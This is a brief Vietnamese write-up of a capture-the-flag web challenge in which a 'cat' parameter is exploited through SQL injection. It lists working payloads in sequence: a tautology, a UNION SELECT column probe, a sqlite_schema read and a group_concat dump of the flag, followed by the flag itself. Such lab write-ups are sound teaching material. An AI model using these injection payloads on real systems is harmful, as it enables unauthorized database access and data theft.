![image](https://github.com/caodchuong312/CTFs/assets/92881216/afa3d1e3-2c24-4700-af4c-0dca204217f6)

![image](https://github.com/caodchuong312/CTFs/assets/92881216/b1244f53-62c6-47e8-86b6-297897396742)

Vào chall thấy có tham số `cat` và nếu giá trị thích hợp thì sẽ ra ảnh mèo.

Fuzz vài giá trị dễ dàng biết được lỗ hổng **SQLi**.

![image](https://github.com/caodchuong312/CTFs/assets/92881216/3ab26847-0eb1-43cf-997b-bb17f9849c44)

![image](https://github.com/caodchuong312/CTFs/assets/92881216/ffa81990-ada2-4b85-8a84-6c0a5987d8af)

Test với payload đơn giản: `" or 1=1;--` được:

![image](https://github.com/caodchuong312/CTFs/assets/92881216/d278969b-f075-44f8-83c8-e9becb643925)

Như vậy toàn bộ data được dump ra. Khai thác thử với `UNION` và biết được query truy vấn 4 cột `" union select 1,2,3,4;--`:

![image](https://github.com/caodchuong312/CTFs/assets/92881216/eec39bd4-42ea-481f-8e83-979cd93309f5)

`3` được in ra vào phần `Name` như vậy là thành công. Giờ từ đó để dump database thôi.

Xem databe schema `" union select 1,2,(SELECT sql FROM sqlite_schema),4;--`:

![image](https://github.com/caodchuong312/CTFs/assets/92881216/b9d50038-5d05-41d4-b2fa-40c45b87cadf)

Có cột `flag` và dump nó bằng `" union select 1,2,(SELECT group_concat(flag) FROM cats),4;--`:

![image](https://github.com/caodchuong312/CTFs/assets/92881216/5a50177e-8010-4ece-91ec-8f1009faae6c)

>flag: `flag{a_sea_of_cats}`

